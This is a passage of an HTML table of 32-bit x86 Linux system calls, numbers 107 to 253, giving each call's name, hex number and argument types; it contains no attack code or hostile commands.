align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">107</td><td align="left">lstat</td><td align="left">0x6b</td><td align="left">const char *filename</td><td align="left">struct __old_kernel_stat *statbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">108</td><td align="left">fstat</td><td align="left">0x6c</td><td align="left">unsigned int fd</td><td align="left">struct __old_kernel_stat *statbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">109</td><td align="left">olduname</td><td align="left">0x6d</td><td align="left">struct oldold_utsname *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">110</td><td align="left">iopl</td><td align="left">0x6e</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">111</td><td align="left">vhangup</td><td align="left">0x6f</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">112</td><td align="left">idle</td><td align="left">0x70</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">113</td><td align="left">vm86old</td><td align="left">0x71</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">114</td><td align="left">wait4</td><td align="left">0x72</td><td align="left">pid_t pid</td><td align="left">int *stat_addr</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">115</td><td align="left">swapoff</td><td align="left">0x73</td><td align="left">const char *specialfile</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">116</td><td align="left">sysinfo</td><td align="left">0x74</td><td align="left">struct sysinfo *info</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">117</td><td align="left">ipc</td><td align="left">0x75</td><td align="left">unsigned int call</td><td align="left">int first</td><td align="left">unsigned long second</td><td align="left">unsigned long third</td><td align="left">void *ptr</td><td align="left">long fifth</td></tr><tr><td align="left">118</td><td align="left">fsync</td><td align="left">0x76</td><td align="left">unsigned int fd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">119</td><td align="left">sigreturn</td><td align="left">0x77</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">120</td><td align="left">clone</td><td align="left">0x78</td><td align="left">unsigned long</td><td align="left">unsigned long</td><td align="left">int *</td><td align="left">int *</td><td align="left">unsigned long</td><td align="left">-</td></tr><tr><td align="left">121</td><td align="left">setdomainname</td><td align="left">0x79</td><td align="left">char *name</td><td align="left">int len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">122</td><td align="left">uname</td><td align="left">0x7a</td><td align="left">struct old_utsname *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">123</td><td align="left">modify_ldt</td><td align="left">0x7b</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">124</td><td align="left">adjtimex</td><td align="left">0x7c</td><td align="left">struct timex *txc_p</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">125</td><td align="left">mprotect</td><td align="left">0x7d</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned long prot</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">126</td><td align="left">sigprocmask</td><td align="left">0x7e</td><td align="left">int how</td><td align="left">old_sigset_t *set</td><td align="left">old_sigset_t *oset</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">127</td><td align="left">create_module</td><td align="left">0x7f</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">128</td><td align="left">init_module</td><td align="left">0x80</td><td align="left">void *umod</td><td align="left">unsigned long len</td><td align="left">const char *uargs</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">129</td><td align="left">delete_module</td><td align="left">0x81</td><td align="left">const char *name_user</td><td align="left">unsigned int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">130</td><td align="left">get_kernel_syms</td><td align="left">0x82</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">131</td><td align="left">quotactl</td><td align="left">0x83</td><td align="left">unsigned int cmd</td><td align="left">const char *special</td><td align="left">qid_t id</td><td align="left">void *addr</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">132</td><td align="left">getpgid</td><td align="left">0x84</td><td align="left">pid_t pid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">133</td><td align="left">fchdir</td><td align="left">0x85</td><td align="left">unsigned int fd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">134</td><td align="left">bdflush</td><td align="left">0x86</td><td align="left">int func</td><td align="left">long data</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">135</td><td align="left">sysfs</td><td align="left">0x87</td><td align="left">int option</td><td align="left">unsigned long arg1</td><td align="left">unsigned long arg2</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">136</td><td align="left">personality</td><td align="left">0x88</td><td align="left">unsigned int personality</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">137</td><td align="left">afs_syscall</td><td align="left">0x89</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">138</td><td align="left">setfsuid</td><td align="left">0x8a</td><td align="left">uid_t uid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">139</td><td align="left">setfsgid</td><td align="left">0x8b</td><td align="left">gid_t gid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">140</td><td align="left">_llseek</td><td align="left">0x8c</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">141</td><td align="left">getdents</td><td align="left">0x8d</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent *dirent</td><td align="left">unsigned int count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">142</td><td align="left">_newselect</td><td align="left">0x8e</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">143</td><td align="left">flock</td><td align="left">0x8f</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">144</td><td align="left">msync</td><td align="left">0x90</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">145</td><td align="left">readv</td><td align="left">0x91</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">146</td><td align="left">writev</td><td align="left">0x92</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">147</td><td align="left">getsid</td><td align="left">0x93</td><td align="left">pid_t pid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">148</td><td align="left">fdatasync</td><td align="left">0x94</td><td align="left">unsigned int fd</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">149</td><td align="left">_sysctl</td><td align="left">0x95</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">150</td><td align="left">mlock</td><td align="left">0x96</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">151</td><td align="left">munlock</td><td align="left">0x97</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">152</td><td align="left">mlockall</td><td align="left">0x98</td><td align="left">int flags</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">153</td><td align="left">munlockall</td><td align="left">0x99</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">154</td><td align="left">sched_setparam</td><td align="left">0x9a</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">155</td><td align="left">sched_getparam</td><td align="left">0x9b</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">156</td><td align="left">sched_setscheduler</td><td align="left">0x9c</td><td align="left">pid_t pid</td><td align="left">int policy</td><td align="left">struct sched_param *param</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">157</td><td align="left">sched_getscheduler</td><td align="left">0x9d</td><td align="left">pid_t pid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">158</td><td align="left">sched_yield</td><td align="left">0x9e</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">159</td><td align="left">sched_get_priority_max</td><td align="left">0x9f</td><td align="left">int policy</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">160</td><td align="left">sched_get_priority_min</td><td align="left">0xa0</td><td align="left">int policy</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">161</td><td align="left">sched_rr_get_interval</td><td align="left">0xa1</td><td align="left">pid_t pid</td><td align="left">struct timespec *interval</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">162</td><td align="left">nanosleep</td><td align="left">0xa2</td><td align="left">struct __kernel_timespec *rqtp</td><td align="left">struct __kernel_timespec *rmtp</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">163</td><td align="left">mremap</td><td align="left">0xa3</td><td align="left">unsigned long addr</td><td align="left">unsigned long old_len</td><td align="left">unsigned long new_len</td><td align="left">unsigned long flags</td><td align="left">unsigned long new_addr</td><td align="left">-</td></tr><tr><td align="left">164</td><td align="left">setresuid</td><td align="left">0xa4</td><td align="left">uid_t ruid</td><td align="left">uid_t euid</td><td align="left">uid_t suid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">165</td><td align="left">getresuid</td><td align="left">0xa5</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">166</td><td align="left">vm86</td><td align="left">0xa6</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">167</td><td align="left">query_module</td><td align="left">0xa7</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">168</td><td align="left">poll</td><td align="left">0xa8</td><td align="left">struct pollfd *ufds</td><td align="left">unsigned int nfds</td><td align="left">int timeout</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">169</td><td align="left">nfsservctl</td><td align="left">0xa9</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">170</td><td align="left">setresgid</td><td align="left">0xaa</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left">gid_t sgid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">171</td><td align="left">getresgid</td><td align="left">0xab</td><td align="left">gid_t *rgid</td><td align="left">gid_t *egid</td><td align="left">gid_t *sgid</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">172</td><td align="left">prctl</td><td align="left">0xac</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left">-</td></tr><tr><td align="left">173</td><td align="left">rt_sigreturn</td><td align="left">0xad</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">174</td><td align="left">rt_sigaction</td><td align="left">0xae</td><td align="left">int</td><td align="left">const struct sigaction *</td><td align="left">struct sigaction *</td><td align="left">size_t</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">175</td><td align="left">rt_sigprocmask</td><td align="left">0xaf</td><td align="left">int how</td><td align="left">sigset_t *set</td><td align="left">sigset_t *oset</td><td align="left">size_t sigsetsize</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">176</td><td align="left">rt_sigpending</td><td align="left">0xb0</td><td align="left">sigset_t *set</td><td align="left">size_t sigsetsize</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">177</td><td align="left">rt_sigtimedwait</td><td align="left">0xb1</td><td align="left">const sigset_t *uthese</td><td align="left">siginfo_t *uinfo</td><td align="left">const struct timespec *uts</td><td align="left">size_t sigsetsize</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">178</td><td align="left">rt_sigqueueinfo</td><td align="left">0xb2</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">179</td><td align="left">rt_sigsuspend</td><td align="left">0xb3</td><td align="left">sigset_t *unewset</td><td align="left">size_t sigsetsize</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">180</td><td align="left">pread64</td><td align="left">0xb4</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">181</td><td align="left">pwrite64</td><td align="left">0xb5</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">182</td><td align="left">chown</td><td align="left">0xb6</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">183</td><td align="left">getcwd</td><td align="left">0xb7</td><td align="left">char *buf</td><td align="left">unsigned long size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">184</td><td align="left">capget</td><td align="left">0xb8</td><td align="left">cap_user_header_t header</td><td align="left">cap_user_data_t dataptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">185</td><td align="left">capset</td><td align="left">0xb9</td><td align="left">cap_user_header_t header</td><td align="left">const cap_user_data_t data</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">186</td><td align="left">sigaltstack</td><td align="left">0xba</td><td align="left">const struct sigaltstack *uss</td><td align="left">struct sigaltstack *uoss</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">187</td><td align="left">sendfile</td><td align="left">0xbb</td><td align="left">int out_fd</td><td align="left">int in_fd</td><td align="left">off_t *offset</td><td align="left">size_t count</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">188</td><td align="left">getpmsg</td><td align="left">0xbc</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">189</td><td align="left">putpmsg</td><td align="left">0xbd</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">190</td><td align="left">vfork</td><td align="left">0xbe</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">191</td><td align="left">ugetrlimit</td><td align="left">0xbf</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">192</td><td align="left">mmap2</td><td align="left">0xc0</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">193</td><td align="left">truncate64</td><td align="left">0xc1</td><td align="left">const char *path</td><td align="left">loff_t length</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">194</td><td align="left">ftruncate64</td><td align="left">0xc2</td><td align="left">unsigned int fd</td><td align="left">loff_t length</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">195</td><td align="left">stat64</td><td align="left">0xc3</td><td align="left">const char *filename</td><td align="left">struct stat64 *statbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">196</td><td align="left">lstat64</td><td align="left">0xc4</td><td align="left">const char *filename</td><td align="left">struct stat64 *statbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">197</td><td align="left">fstat64</td><td align="left">0xc5</td><td align="left">unsigned long fd</td><td align="left">struct stat64 *statbuf</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">198</td><td align="left">lchown32</td><td align="left">0xc6</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">199</td><td align="left">getuid32</td><td align="left">0xc7</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">200</td><td align="left">getgid32</td><td align="left">0xc8</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">201</td><td align="left">geteuid32</td><td align="left">0xc9</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">202</td><td align="left">getegid32</td><td align="left">0xca</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">203</td><td align="left">setreuid32</td><td align="left">0xcb</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">204</td><td align="left">setregid32</td><td align="left">0xcc</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">205</td><td align="left">getgroups32</td><td align="left">0xcd</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">206</td><td align="left">setgroups32</td><td align="left">0xce</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">207</td><td align="left">fchown32</td><td align="left">0xcf</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">208</td><td align="left">setresuid32</td><td align="left">0xd0</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">209</td><td align="left">getresuid32</td><td align="left">0xd1</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">210</td><td align="left">setresgid32</td><td align="left">0xd2</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">211</td><td align="left">getresgid32</td><td align="left">0xd3</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">212</td><td align="left">chown32</td><td align="left">0xd4</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">213</td><td align="left">setuid32</td><td align="left">0xd5</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">214</td><td align="left">setgid32</td><td align="left">0xd6</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">215</td><td align="left">setfsuid32</td><td align="left">0xd7</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">216</td><td align="left">setfsgid32</td><td align="left">0xd8</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">217</td><td align="left">pivot_root</td><td align="left">0xd9</td><td align="left">const char *new_root</td><td align="left">const char *put_old</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">218</td><td align="left">mincore</td><td align="left">0xda</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned char * vec</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">219</td><td align="left">madvise</td><td align="left">0xdb</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int behavior</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">220</td><td align="left">getdents64</td><td align="left">0xdc</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent64 *dirent</td><td align="left">unsigned int count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">221</td><td align="left">fcntl64</td><td align="left">0xdd</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">222</td><td align="left">not implemented</td><td align="left">0xde</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">223</td><td align="left">not implemented</td><td align="left">0xdf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">224</td><td align="left">gettid</td><td align="left">0xe0</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">225</td><td align="left">readahead</td><td align="left">0xe1</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t count</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">226</td><td align="left">setxattr</td><td align="left">0xe2</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left">-</td></tr><tr><td align="left">227</td><td align="left">lsetxattr</td><td align="left">0xe3</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left">-</td></tr><tr><td align="left">228</td><td align="left">fsetxattr</td><td align="left">0xe4</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left">-</td></tr><tr><td align="left">229</td><td align="left">getxattr</td><td align="left">0xe5</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">230</td><td align="left">lgetxattr</td><td align="left">0xe6</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">231</td><td align="left">fgetxattr</td><td align="left">0xe7</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">232</td><td align="left">listxattr</td><td align="left">0xe8</td><td align="left">const char *path</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">233</td><td align="left">llistxattr</td><td align="left">0xe9</td><td align="left">const char *path</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">234</td><td align="left">flistxattr</td><td align="left">0xea</td><td align="left">int fd</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">235</td><td align="left">removexattr</td><td align="left">0xeb</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">236</td><td align="left">lremovexattr</td><td align="left">0xec</td><td align="left">const char *path</td><td align="left">const char *name</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">237</td><td align="left">fremovexattr</td><td align="left">0xed</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">238</td><td align="left">tkill</td><td align="left">0xee</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">239</td><td align="left">sendfile64</td><td align="left">0xef</td><td align="left">int out_fd</td><td align="left">int in_fd</td><td align="left">loff_t *offset</td><td align="left">size_t count</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">240</td><td align="left">futex</td><td align="left">0xf0</td><td align="left">u32 *uaddr</td><td align="left">int op</td><td align="left">u32 val</td><td align="left">struct timespec *utime</td><td align="left">u32 *uaddr2</td><td align="left">u32 val3</td></tr><tr><td align="left">241</td><td align="left">sched_setaffinity</td><td align="left">0xf1</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">242</td><td align="left">sched_getaffinity</td><td align="left">0xf2</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">243</td><td align="left">set_thread_area</td><td align="left">0xf3</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">244</td><td align="left">get_thread_area</td><td align="left">0xf4</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td><td align="left">?</td></tr><tr><td align="left">245</td><td align="left">io_setup</td><td align="left">0xf5</td><td align="left">unsigned nr_reqs</td><td align="left">aio_context_t *ctx</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">246</td><td align="left">io_destroy</td><td align="left">0xf6</td><td align="left">aio_context_t ctx</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">247</td><td align="left">io_getevents</td><td align="left">0xf7</td><td align="left">aio_context_t ctx_id</td><td align="left">long min_nr</td><td align="left">long nr</td><td align="left">struct io_event *events</td><td align="left">struct timespec *timeout</td><td align="left">-</td></tr><tr><td align="left">248</td><td align="left">io_submit</td><td align="left">0xf8</td><td align="left">aio_context_t</td><td align="left">long</td><td align="left">struct iocb * *</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">249</td><td align="left">io_cancel</td><td align="left">0xf9</td><td align="left">aio_context_t ctx_id</td><td align="left">struct iocb *iocb</td><td align="left">struct io_event *result</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">250</td><td align="left">fadvise64</td><td align="left">0xfa</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t len</td><td align="left">int advice</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">251</td><td align="left">not implemented</td><td align="left">0xfb</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">252</td><td align="left">exit_group</td><td align="left">0xfc</td><td align="left">int error_code</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left">253</td><td align="left">lookup_dcookie</td><td 